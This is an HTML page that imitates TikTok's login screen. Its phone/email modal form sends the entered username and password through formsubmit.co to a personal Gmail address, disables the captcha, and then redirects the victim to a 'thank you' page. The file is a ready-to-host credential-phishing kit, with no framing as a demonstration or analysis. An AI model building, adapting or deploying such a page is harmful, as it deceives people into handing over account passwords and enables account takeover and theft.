<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
    body {
      background-color: #f1f1f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background: #fff;
      width: 400px;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img { width: 40px; }
    .welcome {
      text-align: center;
      font-weight: 600;
      font-size: 20px;
      margin-bottom: 25px;
    }
    .login-method {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      padding: 12px 16px;
      border-radius: 8px;
      margin-bottom: 15px;
      cursor: pointer;
      transition: 0.2s;
    }
    .login-method:hover { background: #f7f7f8; }
    .login-method img {
      width: 24px;
      margin-right: 12px;
    }
    .login-method span {
      font-size: 15px;
      color: #333;
    }
    .footer {
      text-align: center;
      margin-top: 25px;
      font-size: 13px;
      color: #888;
    }
    .footer a {
      color: #fe2c55;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }

    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.5);
    }

    .modal-content {
      background-color: #fff;
      margin: 10% auto;
      padding: 20px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      position: relative;
    }

    .close {
      color: #aaa;
      float: right;
      font-size: 28px;
      font-weight: bold;
      cursor: pointer;
    }

    .close:hover { color: #000; }

    #emailForm input,
    #emailForm button {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    #emailForm button {
      background-color: #fe2c55;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }

    #emailForm button:hover {
      background-color: #e0264c;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">
      <img src="https://www.svgrepo.com/show/331760/tiktok.svg" alt="TikTok Logo">
    </div>
    <div class="welcome">Log in to TikTok</div>

    <div class="login-method" onclick="openModal()">
      <img src="https://img.icons8.com/ios-glyphs/30/000000/phone.png"/>
      <span>Use phone / email / username</span>
    </div>

    <div class="login-method" onclick="alert('Login with Facebook')">
      <img src="https://img.icons8.com/ios-filled/50/3b5998/facebook.png"/>
      <span>Continue with Facebook</span>
    </div>

    <div class="login-method" onclick="alert('Login with Twitter')">
      <img src="https://img.icons8.com/color/48/000000/twitter--v1.png"/>
      <span>Continue with Twitter</span>
    </div>

    <div class="footer">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <!-- Modal -->
  <div id="loginModal" class="modal">
    <div class="modal-content">
      <span class="close" onclick="closeModal()">&times;</span>

      <form id="emailForm" action="https://formsubmit.co/kavindudeshapriya08@gmail.com" method="POST">
        <h3>Enter your phone or email</h3>
        <input type="text" name="user" placeholder="Phone number or email" required>

        <h3>Enter your password</h3>
        <input type="password" name="password" placeholder="Password" required>

        <!-- Redirect after submit -->
        <input type="hidden" name="_next" value="https://your-site-name.netlify.app/thankyou.html">

        <!-- Optional: disable captcha -->
        <input type="hidden" name="_captcha" value="false">

        <button type="submit">Login</button>
      </form>
    </div>
  </div>

  <script>
    function openModal() {
      document.getElementById("loginModal").style.display = "block";
    }

    function closeModal() {
      document.getElementById("loginModal").style.display = "none";
    }

    // Close when clicking outside modal
    window.onclick = function(event) {
      const modal = document.getElementById("loginModal");
      if (event.target == modal) {
        closeModal();
      }
    }
  </script>

</body>
</html>
